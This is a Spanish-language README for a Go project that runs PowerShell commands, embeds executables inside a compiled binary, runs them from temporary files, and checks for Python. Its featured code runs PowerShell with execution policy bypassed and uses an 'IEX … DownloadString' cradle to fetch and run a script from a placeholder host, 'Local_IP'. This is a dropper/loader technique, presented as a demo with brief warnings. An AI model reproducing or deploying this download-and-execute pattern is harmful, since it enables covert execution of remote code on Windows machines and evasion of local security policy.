# Proyecto: Ejecución de Comandos PowerShell y Embebido de Ejecutables en Go

## Descripción

Este proyecto demuestra cómo ejecutar comandos de PowerShell desde un programa en Go y cómo embeber y ejecutar archivos ejecutables dentro de un binario compilado. Además, se verifica la instalación de Python y sus módulos necesarios.

## Características

- Ejecución de comandos PowerShell desde Go.
- Uso de `embed.FS` para incluir archivos binarios en el ejecutable.
- Verificación e instalación de Python y módulos requeridos.
- Creación y ejecución de archivos temporales.
- Cross-compiling para Windows desde Linux/macOS.

## Requisitos

- Go instalado ([Descargar Go](https://go.dev/dl/))
- Python instalado y agregado al `PATH`
- Módulos de Python requeridos (verificación e instalación automática en el código)
- PowerShell en sistemas Windows

## Instalación

Clona este repositorio:

```sh
git clone https://github.com/tu-usuario/tu-repo.git
cd tu-repo
```

Compila el ejecutable para Windows:

```sh
GOOS=windows GOARCH=amd64 go build -o program.exe
```

O compila directamente en Windows:

```sh
go build -o program.exe
```

## Uso

Ejecuta el programa en Windows:

```sh
./program.exe
```

Si estás ejecutando en un entorno de desarrollo, asegúrate de que PowerShell esté disponible y que Python tenga los módulos requeridos.

## Código Destacado

### Ejecución de PowerShell desde Go

```go
cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command",
    "IEX (New-Object Net.WebClient).DownloadString('http://Local_IP/powershellfile.txt')")
output, err := cmd.CombinedOutput()
if err != nil {
    fmt.Println("Error ejecutando el comando:", err)
    return
}
fmt.Println("Salida del comando:", string(output))
```

### Verificación e Instalación de Python y Módulos

```go
func EnsurePythonInstalled() {
    cmd := exec.Command("python", "--version")
    err := cmd.Run()
    if err != nil {
        log.Fatalf("Python no está instalado o no está en el PATH.")
    }
    fmt.Println("Python está instalado.")
}
```

## Seguridad y Consideraciones

- **Advertencia**: Ejecutar comandos remotos de PowerShell puede ser riesgoso y debe hacerse solo en entornos controlados.
- **Revisión del código**: Antes de ejecutar cualquier script, revisa el código para evitar ejecución de comandos maliciosos.
- **Firewall y antivirus**: Algunos antivirus pueden bloquear la descarga y ejecución de scripts remotos.

## Licencia

Este proyecto está bajo la licencia MIT. Puedes ver más detalles en el archivo `LICENSE`.

## Contacto

Si tienes dudas o sugerencias, puedes abrir un issue en el repositorio o contactarme en [correo@example.com](mailto:correo@example.com).

